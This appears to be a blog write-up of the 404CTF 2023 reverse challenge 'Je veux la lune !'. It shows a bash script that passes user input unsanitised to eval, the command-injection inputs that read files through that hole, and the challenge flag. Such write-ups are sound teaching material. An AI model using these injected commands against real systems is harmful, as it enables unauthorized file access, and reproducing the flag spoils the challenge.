---
title: CTFs | 404CTF_2023 | Reverse | Je veux la lune !
author: BatBato
date: 2023-06-08
categories: [CTFs, 404CTF_2023, Reverse]
tags: [Reverse, Command Injection, Injection]
permalink: /CTFs/404CTF_2023/Reverse/Je_veux_la_lune
---

# Je veux la lune !

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/f412c753-621a-4915-9b7e-5764fb208929)

The challenge gives us the following code:

```bash
#!/bin/bash
Caligula=Caius
listePersonnes="Cherea Caesonia Scipion Senectus Lepidus Caligula Caius Drusilla"
echo "Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !
En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?"
read personne
eval "grep -wie ^$personne informations.txt"

while true; do
    echo "
De qui d'autre tu veux que je te parle ?"
    read personne
    if [ -n $personne ] && [ $personne = "stop" ] ; then
    exit
    fi
    bob=$(grep -wie ^$personne informations.txt)
    if [ -z "$bob" ]; then
        echo "Je n'ai pas compris de qui tu parlais. Dis-moi stop si tu veux que je m'arrête, et envoie l'un des noms que j'ai cités si tu veux des informations."
    else
        echo $bob
    fi  
done
```

As we can see in the above code, there is no sanitization of the input `presonne`. So we can just type `404CTF flag.txt;grep -iRl 404CTF /; ls` (I used `flag.txt` but you can use anything you want) and we get:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/cb877376-7f51-41a6-98cf-736373181057)

> Note that we added `ls` at the end. This is just so that the final command looks like `grep -wie 404CTF flag.txt;grep -iRl 404CTF /; ls informations.txt `
{: .prompt-info}

Now we can run the command `404CTF flag.txt;cat /proc/self/task/3/cwd/lune.txt; ls` to get the flag:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/d83a2239-a8c0-4d17-b23b-dc6da1fbf71a)

The flag is `404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}`
